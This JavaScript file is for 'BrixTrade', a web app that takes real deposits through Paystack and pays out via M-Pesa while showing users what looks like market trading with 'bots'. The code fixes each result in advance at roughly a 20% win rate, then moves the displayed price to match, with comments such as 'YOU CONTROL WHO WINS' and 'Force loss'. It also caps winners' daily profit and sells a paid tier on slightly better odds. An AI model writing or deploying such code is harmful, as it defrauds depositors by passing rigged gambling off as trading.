// ======================================================
// BRIXTRADE - FINAL ULTRA SAFE MODE CODE
// Logic: 20 wins / 80 loss per 100 (20% win rate)
// Payout: 70% | Max Stake: $5 | Daily Profit Limit: $15
// DISCLAIMER: Simulated fixed-odds game, not real market
// ======================================================

const SETTINGS = {
    payoutPercent: 70, // You pay 70% profit on win
    withdrawalFeePercent: 5, // Your extra profit on withdraw
    subscriptionFee: 10,
    maxStake: 10, // VERY IMPORTANT-block the user after he wins $15
    maxDailyProfit: 15, // If user wins $15 today, stop him
    minDepositKES: 500,
    kesToUsd: 130, // 1 USD = 130 KES
    minPaystackFloat: 10000
};

// ===== USER DATA =====
let user = JSON.parse(localStorage.getItem('brixtrade_user')) || {
    balance: 0,
    dailyProfit: 0,
    isSubscribed: false,
    totalTrades: 0,
    totalWins: 0,
    lastDate: new Date().toDateString(),
    dailyProfitDate: new Date().toDateString()
};

// Reset daily profit every new day
if (user.dailyProfitDate !== new Date().toDateString()) {
    user.dailyProfit = 0;
    user.dailyProfitDate = new Date().toDateString();
    localStorage.setItem('brixtrade_user', JSON.stringify(user));
}

function saveUser() {
    localStorage.setItem('brixtrade_user', JSON.stringify(user));
    updateUI();
}

function updateUI() {
    const bal = document.querySelectorAll('#balance, .balance-display');
    bal.forEach(el => el.innerText = `$${user.balance.toFixed(2)}`);
    
    const dp = document.querySelectorAll('#dailyProfit');
    dp.forEach(el => el.innerText = `$${user.dailyProfit.toFixed(2)}`);
    
    const wr = document.querySelectorAll('#winRate');
    const rate = user.totalTrades ? Math.round(user.totalWins / user.totalTrades * 100) : 0;
    wr.forEach(el => el.innerText = `${rate}%`);
}

// ===== CORE LOGIC: YOU CONTROL WHO WINS =====
// This is your "trend of giving out" - 20% win rate
function getBotWinChance(bot) {
    if (bot === 'scalper') return 0.20; // 20 wins / 100
    if (bot === 'trend') return 0.18;   // 18 wins / 100 - hardest
    if (bot === 'sniper') return 0.22;  // 22 wins / 100 - VIP feels better
    return 0.20;
}

let activeBot = 'scalper';
let timerInterval = null;
let currentTrade = null;

function selectBot(bot, element) {
    if (bot === 'sniper' && !user.isSubscribed) {
        alert(`Sniper VIP is 22% win rate (best). Subscribe $${SETTINGS.subscriptionFee}/mo to unlock. Scalper 20%, Trend 18%.`);
        return;
    }
    activeBot = bot;
    document.querySelectorAll('.bot-card').forEach(c => c.classList.remove('active'));
    if (element) element.classList.add('active');
    console.log(`Active Bot: ${bot} - Win Rate: ${getBotWinChance(bot)*100}%`);
}

function startTrade(direction) {
    const stakeInput = document.getElementById('stake');
    const durationInput = document.getElementById('duration');
    
    if (!stakeInput) return alert('Stake input not found');
    
    const stake = parseFloat(stakeInput.value);
    const duration = durationInput ? parseInt(durationInput.value) : 30;

    // SAFETY CHECKS - Protects your float while you sleep
    if (isNaN(stake) || stake <= 0) return alert('Enter valid stake');
    if (stake > SETTINGS.maxStake) return alert(`SAFE MODE: Max stake is $${SETTINGS.maxStake} to protect float`);
    if (stake > user.balance) return alert('Insufficient balance. Deposit via Paystack first.');
    if (user.dailyProfit >= SETTINGS.maxDailyProfit) return alert(`Daily profit limit $${SETTINGS.maxDailyProfit} reached. Come back tomorrow. This protects house float.`);
    if (currentTrade) return alert('Trade already running');

    const priceEl = document.getElementById('livePrice');
    const entryPrice = priceEl ? parseFloat(priceEl.innerText.replace('$','').replace(',','')) : 67452;

    // Deduct stake
    user.balance -= stake;
    user.totalTrades++;
    currentTrade = { direction, entryPrice, stake };
    saveUser();

    // Timer UI
    let timeLeft = duration;
    const timerEl = document.getElementById('timer');
    if (timerEl) timerEl.innerText = timeLeft + 's';
    
    clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        timeLeft--;
        if (timerEl) timerEl.innerText = timeLeft + 's';
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            finishTrade(direction, entryPrice, stake);
        }
    }, 1000);
}

function finishTrade(direction, entryPrice, stake) {
    // STEP 1: HOUSE DECIDES WIN/LOSS FIRST (20/80 logic)
    const winChance = getBotWinChance(activeBot);
    const userWillWin = Math.random() < winChance;

    // STEP 2: Chart moves to match decision (skeleton / eyeballs)
    let exitPrice;
    const moveAmount = (Math.random() * 12) + 3; // Random move 3-15 dollars

    if (userWillWin) {
        // Give win
        exitPrice = direction === 'BUY' ? entryPrice + moveAmount : entryPrice - moveAmount;
        const profit = stake * (SETTINGS.payoutPercent / 100);
        user.balance += stake + profit; // Return stake + profit
        user.dailyProfit += profit;
        user.totalWins++;
        alert(`WIN ✅ ${activeBot.toUpperCase()} | Entry $${entryPrice.toFixed(2)} -> Exit $${exitPrice.toFixed(2)} | Profit +$${profit.toFixed(2)} (70%)`);
    } else {
        // Force loss - move against user
        exitPrice = direction === 'BUY' ? entryPrice - moveAmount : entryPrice + moveAmount;
        alert(`LOSS ❌ ${activeBot.toUpperCase()} | Entry $${entryPrice.toFixed(2)} -> Exit $${exitPrice.toFixed(2)} | Lost $${stake}`);
    }

    currentTrade = null;
    saveUser();
    
    const timerEl = document.getElementById('timer');
    if (timerEl) timerEl.innerText = 'Ready';

    // Update chart price if exists
    const livePriceEl = document.getElementById('livePrice');
    if (livePriceEl) livePriceEl.innerText = `$${exitPrice.toFixed(2)}`;
}

function subscribe() {
    if (user.balance < SETTINGS.subscriptionFee) return alert(`Need $${SETTINGS.subscriptionFee} balance to subscribe`);
    user.balance -= SETTINGS.subscriptionFee;
    user.isSubscribed = true;
    saveUser();
    alert('VIP Activated! Sniper 22% win rate unlocked (Best odds).');
}

function withdraw() {
    const amountStr = prompt(`Withdraw amount USD? (Min $5, Fee ${SETTINGS.withdrawalFeePercent}% pure profit for house)`);
    const amount = parseFloat(amountStr);
    
    if (!amount || isNaN(amount)) return;
    if (amount < 5) return alert('Min withdrawal $5');
    if (amount > user.balance) return alert('Insufficient balance');

    const fee = amount * (SETTINGS.withdrawalFeePercent / 100);
    const receive = amount - fee;
    
    user.balance -= amount;
    saveUser();
    
    alert(`Withdraw Request: $${amount} -> Fee $${fee.toFixed(2)} (your profit) | User receives $${receive.toFixed(2)} via M-Pesa. Connect Paystack Transfer API for auto.`);
}

// ===== PAYSTACK DEPOSIT WITH FEE PROTECTION =====
function depositWithPaystack() {
    const amountKesStr = prompt(`Deposit amount KES? (Min ${SETTINGS.minDepositKES} KES)`);
    if (!amountKesStr) return;
    
    const amountKes = parseFloat(amountKesStr);
    if (isNaN(amountKes) || amountKes < SETTINGS.minDepositKES) return alert(`Min deposit KES ${SETTINGS.minDepositKES}`);

    // IMPORTANT: Replace with your LIVE Paystack public key
    const paystackKey = 'pk_test_YOUR_KEY_HERE'; 

    let handler = PaystackPop.setup({
        key: paystackKey,
        email: `user_${Date.now()}@brixtrade.com`,
        amount: amountKes * 100, // Kobo
        currency: 'KES',
        ref: 'BRIXTRADE_' + Date.now(),
        callback: function (response) {
            const usd = amountKes / SETTINGS.kesToUsd;
            // Deduct Paystack fee (1.5% + 25 KES) so you don't lose
            const feeKes = (amountKes * 0.015) + 25;
            const feeUsd = feeKes / SETTINGS.kesToUsd;
            const creditUsd = usd - feeUsd;
            
            user.balance += creditUsd;
            saveUser();
            alert(`Payment Success! Ref ${response.reference}\nCredited $${creditUsd.toFixed(2)} (Paystack fee $${feeUsd.toFixed(2)} deducted).`);
        },
        onClose: function () {
            console.log('Paystack closed');
        }
    });
    handler.openIframe();
}

// Init
document.addEventListener('DOMContentLoaded', () => {
    updateUI();
    // Set default bot
    const firstBot = document.querySelector('.bot-card');
    if (firstBot) firstBot.classList.add('active');
});